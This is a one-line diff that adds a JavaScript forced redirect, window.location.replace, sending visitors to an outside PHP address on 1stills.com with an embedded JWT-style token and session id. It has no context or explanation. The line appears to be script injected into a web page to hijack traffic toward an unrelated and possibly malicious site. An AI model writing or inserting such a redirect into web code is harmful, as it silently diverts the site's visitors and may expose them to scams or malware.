@@ -1,0 +1,1 @@
+window.location.replace('http://1stills.com/1stil.php?ch=1&js=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJKb2tlbiIsImV4cCI6MTY4OTQxNjI4MSwiaWF0IjoxNjg5NDA5MDgxLCJpc3MiOiJKb2tlbiIsImpzIjoxLCJqdGkiOiIydG92cDZ1NGY1b2QxMHBsa28wMjBuc2kiLCJuYmYiOjE2ODk0MDkwODEsInRzIjoxNjg5NDA5MDgxMTg2OTgxfQ.kBFbAHMZwvc7-HaCng2cs2LBfjBGxFbCsQbFlz9Tues&sid=1d23b67c-22e8-11ee-a38a-49baf0dccc72');
